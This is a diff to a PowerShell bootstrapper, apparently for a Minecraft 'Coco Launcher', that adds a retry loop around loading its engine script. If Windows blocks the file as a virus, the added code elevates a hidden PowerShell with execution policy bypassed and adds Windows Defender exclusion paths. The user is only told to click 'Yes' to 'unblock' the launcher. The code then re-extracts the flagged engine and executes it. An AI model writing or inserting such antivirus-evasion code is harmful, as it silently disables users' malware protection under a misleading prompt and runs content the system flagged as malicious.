@@ -480,6 +480,34 @@ if ($ShowOnUpdate) { $engineParameters.ShowOnUpdate=$true }
 if ($Silent) { $engineParameters.Silent=$true }
 Set-CocoSplash 'Componentes listos; iniciando Coco Launcher...' 12
 $env:COCO_ENGINE_ROOT=$engineRoot
-$engineSource=[IO.File]::ReadAllText($entryPoint,[Text.Encoding]::UTF8)
+$engineSource=$null
+for($bootAttempt=1;$bootAttempt-le3;$bootAttempt++){
+    try{
+        $engineSource=[IO.File]::ReadAllText($entryPoint,[Text.Encoding]::UTF8)
+        break
+    }catch [System.IO.IOException]{
+        $isVirusError=($_.Exception.Message -match '(?i)(virus|amenaza|malware|unwanted|no deseado)') -or ($_.Exception.HResult -eq -2147024671)
+        if($isVirusError -and $bootAttempt -lt 3){
+            Set-CocoSplash 'Pulsa "Si" en el aviso de Windows para desbloquear Coco Launcher...' 12
+            $localCoco=[IO.Path]::GetFullPath($cacheRoot).TrimEnd('\')
+            $appDataCoco=[IO.Path]::GetFullPath((Join-Path $env:APPDATA 'CocoMinecraft')).TrimEnd('\')
+            try{
+                $cmd="Add-MpPreference -ExclusionPath '$localCoco','$appDataCoco' -ErrorAction SilentlyContinue"
+                $proc=Start-Process powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-Command',$cmd) -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
+                if($proc){$proc.WaitForExit(30000)|Out-Null}
+            }catch{}
+            if(Test-Path -LiteralPath $engineZip){
+                try{
+                    Expand-CocoEngineArchive $engineZip $temporaryRoot
+                    Get-ChildItem -LiteralPath $temporaryRoot -Force | Copy-Item -Destination $engineRoot -Recurse -Force -ErrorAction SilentlyContinue
+                    Remove-Item -LiteralPath $temporaryRoot -Recurse -Force -ErrorAction SilentlyContinue
+                }catch{}
+            }
+            Start-Sleep -Milliseconds 500
+            continue
+        }
+        throw
+    }
+}
 $engineBlock=[ScriptBlock]::Create($engineSource)
 & $engineBlock @engineParameters
